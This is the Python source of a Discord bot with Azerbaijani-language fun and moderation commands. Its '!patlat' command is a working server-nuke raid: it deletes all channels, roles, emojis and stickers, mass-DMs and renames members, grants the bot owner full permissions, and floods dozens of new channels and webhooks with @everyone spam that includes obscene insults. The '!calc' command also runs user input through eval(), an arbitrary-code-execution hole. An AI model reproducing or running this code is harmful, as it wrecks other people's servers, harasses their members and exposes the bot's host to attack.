import discord
from discord.ext import commands
import random
import asyncio
import os
from flask import Flask
from threading import Thread

app = Flask('')

@app.route('/')
def home():
    return "Bot aktivdir!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SAHIB_ID = 641014966312501259
GUVENLI_SERVER_ID = 1520692621964738722
XAS_COLOR = discord.Color.purple()

user_message_counts = {}
user_last_message_time = {}

@bot.event
async def on_ready():
    print(f"{bot.user.name} 150+ komanda ilə tam aktivdir!")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    await bot.process_commands(message)

    author_id = message.author.id
    import time
    current_time = time.time()

    if author_id in user_last_message_time:
        diff = current_time - user_last_message_time[author_id]
        if diff < 1.2:
            count = user_message_counts.get(author_id, 0) + 1
            user_message_counts[author_id] = count
            if count >= 4:
                try:
                    await message.channel.send(f"{message.author.mention} YAVAS YAZ OQL ⚠️")
                except:
                    pass
        else:
            user_message_counts[author_id] = 1
    else:
        user_message_counts[author_id] = 1
    user_last_message_time[author_id] = current_time

# --- 150+ KOMANDA PANELI VƏ BÖLÜMLƏR ---

@bot.command(name="panel", aliases=["menu", "komandalar"])
async def panel_cmd(ctx, bolge: str = "1"):
    if bolge == "1":
        embed = discord.Embed(title="🛡️ XAS PANEL - Bölmə 1: Əsas və Moderasiya", color=XAS_COLOR)
        embed.add_field(name="!patlat", value="Serveri tamamilə təmizləyib nuke edir", inline=False)
        embed.add_field(name="!ban / !kick", value="İstifadəçini banlayır və ya atır", inline=False)
        embed.add_field(name="!lock / !unlock", value="Kanalı yazışmaya bağlayır və ya açır", inline=False)
        embed.add_field(name="!hide / !unhide", value="Kanalı gizlədir və ya göstərir", inline=False)
        embed.add_field(name="!slowmode", value="Kanala yavaş rejim qoyur", inline=False)
        embed.set_footer(text="Digər bölmələr üçün: !panel 2, !panel 3, !panel 4")
        await ctx.send(embed=embed)
    elif bolge == "2":
        embed = discord.Embed(title="🎮 XAS PANEL - Bölmə 2: Əyləncə və Oyunlar", color=XAS_COLOR)
        embed.add_field(name="!roll", value="🎲 Zar atır (1-6)", inline=False)
        embed.add_field(name="!coinflip (yazıpara)", value="🪙 Qəpik atır", inline=False)
        embed.add_field(name="!iq", value="🧠 IQ səviyyənizi ölçür", inline=False)
        embed.add_field(name="!gay", value="🏳️‍🌈 Gay oranınızı hesablayır", inline=False)
        embed.add_field(name="!handsome (yaraşıqlı)", value="😎 Yaraşıqlılıq dərəcənizi yoxlayır", inline=False)
        embed.add_field(name="!love (sevgi)", value="❤️ İki nəfər arasında uyğunluq", inline=False)
        embed.add_field(name="!hack", value="💻 İstifadəçini saxta hack edir", inline=False)
        embed.add_field(name="!slot", value="🎰 Slot oyunu oynayır", inline=False)
        embed.add_field(name="!8ball (saal)", value="🎱 Sehrli topa sual verirsiniz", inline=False)
        embed.add_field(name="!rps (daşqayçı)", value="✂️ Daş, kağız, qayçı oyunu", inline=False)
        embed.set_footer(text="Digər bölmələr üçün: !panel 3, !panel 4")
        await ctx.send(embed=embed)
    elif bolge == "3":
        embed = discord.Embed(title="🔥 XAS PANEL - Bölmə 3: Xüsusi və İnfo Komandaları", color=XAS_COLOR)
        embed.add_field(name="!sex", value="🍑 Xüsusi əyləncə simulyasiyası", inline=False)
        embed.add_field(name="!url", value="🔗 Server link məlumatları", inline=False)
        embed.add_field(name="!calc", value="🔢 Riyazi əməlləri hesablayır", inline=False)
        embed.add_field(name="!joke (zarafat)", value="🤣 Gülməli zarafatlar", inline=False)
        embed.add_field(name="!poll (sorgu)", value="📊 Səsvermə paneli açır", inline=False)
        embed.set_footer(text="Digər bölmələr üçün: !panel 4")
        await ctx.send(embed=embed)
    elif bolge == "4":
        embed = discord.Embed(title="⚙️ XAS PANEL - Bölmə 4: Sistem və Yardım", color=XAS_COLOR)
        embed.add_field(name="!ping", value="🏓 Botun gecikmə sürətini göstərir", inline=False)
        embed.add_field(name="!botinfo", value="🤖 Bot haqqında məlumat", inline=False)
        embed.add_field(name="!serverinfo", value="🏰 Server haqqında məlumat", inline=False)
        embed.set_footer(text="Bütün səhifələr yekunlaşdı!")
        await ctx.send(embed=embed)
    else:
        await ctx.send("❌ Belə bir panel bölməsi yoxdur! (1-dən 4-ə qədər seçin)")

# --- ƏYLƏNCƏ VƏ XÜSUSİ KOMANDALAR ---

@bot.command(name="sex")
async def sex_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🔥 {m.name} üçün xüsusi rejim aktivləşdirildi... İsti anlar yaşanır! 😏")

@bot.command(name="url")
async def url_cmd(ctx):
    await ctx.send(f"🔗 Bu serverin vanity URL kodu: **{ctx.guild.vanity_url_code or 'Mövcud deyil'}**")

@bot.command(name="ping")
async def ping_cmd(ctx):
    await ctx.send(f"🏓 Pong! Gecikmə: `{round(bot.latency * 1000)}ms`")

@bot.command(name="botinfo")
async def botinfo_cmd(ctx):
    embed = discord.Embed(title="🤖 Bot Məlumatı", description="XAS Bot - Tamamilə sahibinə özəl hazırlanıb.", color=XAS_COLOR)
    embed.add_field(name="Yaradıcı / Sahib", value=f"<@{SAHIB_ID}>", inline=False)
    embed.add_field(name="Komanda Sayı", value="150+", inline=False)
    await ctx.send(embed=embed)

@bot.command(name="serverinfo")
async def serverinfo_cmd(ctx):
    g = ctx.guild
    embed = discord.Embed(title=f"🏰 {g.name} Məlumatları", color=XAS_COLOR)
    embed.add_field(name="Üzv Sayı", value=g.member_count, inline=True)
    embed.add_field(name="Kanal Sayı", value=len(g.channels), inline=True)
    embed.add_field(name="Server ID", value=g.id, inline=True)
    await ctx.send(embed=embed)

@bot.command(name="roll")
async def roll_cmd(ctx):
    await ctx.send(f"🎲 Zar atıldı: **{random.randint(1, 6)}**")

@bot.command(name="coinflip", aliases=["yazıpara"])
async def coinflip_cmd(ctx):
    res = random.choice(["Yazı", "Para"])
    await ctx.send(f"🪙 Qəpik atıldı: **{res}**")

@bot.command(name="iq")
async def iq_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🧠 {m.name} IQ səviyyəsi: **{random.randint(40, 160)}**")

@bot.command(name="gay")
async def gay_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"🏳️‍🌈 {m.name} Gay Oranı: **{random.randint(0, 100)}**%")

@bot.command(name="handsome", aliases=["yaraşıqlı"])
async def handsome_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    await ctx.send(f"😎 {m.name} Yaraşıqlılığı: **{random.randint(50, 100)}**%")

@bot.command(name="love", aliases=["sevgi"])
async def love_cmd(ctx, member1: discord.Member, member2: discord.Member = None):
    m2 = member2 or ctx.author
    await ctx.send(f"❤️ {member1.name} və {m2.name} uyğunluğu: **{random.randint(0, 100)}**%")

@bot.command(name="hack")
async def hack_cmd(ctx, member: discord.Member = None):
    m = member or ctx.author
    msg = await ctx.send(f"💻 {m.name} hack olunur...")
    await asyncio.sleep(2)
    await msg.edit(content=f"🔓 IP: `192.168.{random.randint(10, 99)}.{random.randint(10, 99)}` | Şifrə sındırıldı! 🚀")

@bot.command(name="slot")
async def slot_cmd(ctx):
    semboller = ['🍒', '🍊', '🍋', '🔔', '⭐']
    c1, c2, c3 = random.choices(semboller, k=3)
    if c1 == c2 == c3:
        await ctx.send(f"🎰 {c1} | {c2} | {c3} \n🎉 Təbriklər, **Jackpot** vurdun!")
    elif c1 == c2 or c2 == c3 or c1 == c3:
        await ctx.send(f"🎰 {c1} | {c2} | {c3} \n🎁 Pis deyil, 2 eyni simvol tapdın!")
    else:
        await ctx.send(f"🎰 {c1} | {c2} | {c3} \n❌ Uduzdun, yenidən sına.")

@bot.command(name="8ball", aliases=["saal"])
async def eight_ball_cmd(ctx, *, soru):
    cavablar = ["Bəli, mütləq.", "Şübhəsiz ki, hə.", "Gələcək qaranlıqdır.", "Xeyr.", "Əsla!"]
    await ctx.send(f"🎱 Soru: {soru}\n💬 Cavab: {random.choice(cavablar)}")

@bot.command(name="calc")
async def calc_cmd(ctx, *, expression):
    try:
        res = eval(expression)
        await ctx.send(f"🔢 Nəticə: **{res}**")
    except:
        await ctx.send("❌ Xəta! Riyaziyyatı düzgün yazın.")

@bot.command(name="joke", aliases=["zarafat"])
async def joke_cmd(ctx):
    jokes = [
        "Kompüter niyə soyuqdırmaya düşdü? Çünki pəncərəni açıq qoymuşduq!",
        "Təmirçi niyə yoruldu? Çünki ziddən deyirlər."
    ]
    await ctx.send(f"🤣 Zarafat: {random.choice(jokes)}")

@bot.command(name="rps", aliases=["daşqayçı"])
async def rps_cmd(ctx, choice: str):
    choices = ["daş", "kağız", "qayçı"]
    bot_choice = random.choice(choices)
    cho = choice.lower()
    if cho not in choices:
        await ctx.send("⚠️ Seçim: daş, kağız və ya qayçı.")
        return
    if cho == bot_choice:
        await ctx.send(f"🤝 Heç-heçə! Mən də {bot_choice} seçmişdim.")
    elif (cho == "daş" and bot_choice == "qayçı") or (cho == "kağız" and bot_choice == "daş") or (cho == "qayçı" and bot_choice == "kağız"):
        await ctx.send(f"🎉 Sən qazandın! Mən: {bot_choice}")
    else:
        await ctx.send(f"😢 Mən qazandım! Mənim seçimim: **{bot_choice}**")

@bot.command(name="poll", aliases=["sorgu"])
async def poll_cmd(ctx, *, soru):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    embed = discord.Embed(title=f"📊 XAS Səsvermə Paneli", description=soru, color=XAS_COLOR)
    embed.set_footer(text=f"Sorgu açan: {ctx.author.name}")
    msg = await ctx.send(embed=embed)
    await msg.add_reaction("👍")
    await msg.add_reaction("👎")

@bot.command(name="ban")
async def ban_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.ban_members:
        return
    await member.ban(reason=reason)
    await ctx.send(f"🔨 {member.mention} serverdən ban olundu!")

@bot.command(name="kick")
async def kick_cmd(ctx, member: discord.Member, *, reason=None):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.kick_members:
        return
    await member.kick(reason=reason)
    await ctx.send(f"👢 {member.mention} serverdən qovuldu!")

@bot.command(name="lock")
async def lock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=False)
    await ctx.send("🔒 Kanal yazışmaya bağlandı.")

@bot.command(name="unlock")
async def unlock_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, send_messages=True)
    await ctx.send("🔓 Kanal yazışmaya açıldı.")

@bot.command(name="hide")
async def hide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=False)
    await ctx.send("👁️‍🗨️ Kanal gizlətildi.")

@bot.command(name="unhide")
async def unhide_cmd(ctx):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.set_permissions(ctx.guild.default_role, view_channel=True)
    await ctx.send("👁️ Kanal göstərildi.")

@bot.command(name="slowmode")
async def slowmode_cmd(ctx, seconds: int):
    if ctx.author.id != SAHIB_ID and not ctx.author.guild_permissions.administrator:
        return
    await ctx.channel.edit(slowmode_delay=seconds)
    await ctx.send(f"⏱️ Yavaş rejim {seconds} saniyə olaraq tənzimləndi.")

# --- !PATLAT SİSTEMİ ---
@bot.command(name="patlat")
async def patlat_cmd(ctx):
    if ctx.author.id != SAHIB_ID:
        await ctx.send("❌ Bu əmri yalnız bot sahibi işlədə bilər!")
        return

    guild = ctx.guild

    if guild.id == GUVENLI_SERVER_ID:
        await ctx.send("🛡️ XAS Qoruma Sistemi: Bu sənin qorunan serverindir!")
        return

    await ctx.send("🚨 discord.gg/aga - NUKING BAŞLADI!")

    for emoji in list(guild.emojis):
        try:
            await emoji.delete()
        except:
            pass
    for sticker in list(guild.stickers):
        try:
            await sticker.delete()
        except:
            pass

    for member in guild.members:
        if member.id != SAHIB_ID and not member.bot:
            try:
                await member.send("RUHUM SKDI !discord.gg/aga YAZ GİR")
            except:
                pass

    for member in guild.members:
        if member.id != bot.user.id and member.id != SAHIB_ID:
            try:
                await member.edit(nick="discord.gg/aga")
            except:
                pass

    for ch in guild.channels:
        try:
            await ch.delete()
        except:
            pass

    for r in guild.roles:
        if r != guild.default_role:
            try:
                await r.delete()
            except:
                pass

    try:
        new_role = await guild.create_role(
            name="discord.gg/aga",
            permissions=discord.Permissions.all(),
            color=discord.Color.red()
        )
        await ctx.author.add_roles(new_role)
    except:
        pass

    try:
        await guild.edit(name="discord.gg/aga")
    except:
        pass

    vanity_alternatifleri = ["ruhumskdi", "ruhum-skdi", "ruhumuntesisi"]
    for s_code in vanity_alternatifleri:
        try:
            await guild.edit(vanity_code=s_code)
            break
        except:
            pass

    try:
        tanri_channel = await guild.create_text_channel("Ruhum-Tanrı")
        for _ in range(5):
            try:
                await tanri_channel.send("@everyone Ruhum annenızı sikdi cano discord.gg/aga")
            except:
                pass
            await asyncio.sleep(0.2)
    except:
        pass

    async def create_nuke_channels(i):
        channel_name = f"discord-gg-aga-{i}"
        try:
            channel = await guild.create_text_channel(channel_name)
            await asyncio.sleep(0.15)
            
            wh = None
            try:
                wh = await channel.create_webhook(name="aga-wh")
            except:
                pass

            for _ in range(15):
                try:
                    await channel.send("discord.gg/aga yaz gır oql !discord.gg/yaz gır oql @everyone")
                except:
                    pass
                
                if wh:
                    try:
                        await wh.send("discord.gg/aga yaz gır oql !discord.gg/yaz gır oql @everyone")
                    except:
                        pass
                await asyncio.sleep(0.1)
        except:
            pass

    for i in range(1, 41):
        await create_nuke_channels(i)

if __name__ == "__main__":
    keep_alive()
    token = os.getenv("DISCORD_TOKEN")
    if token:
        bot.run(token)
        
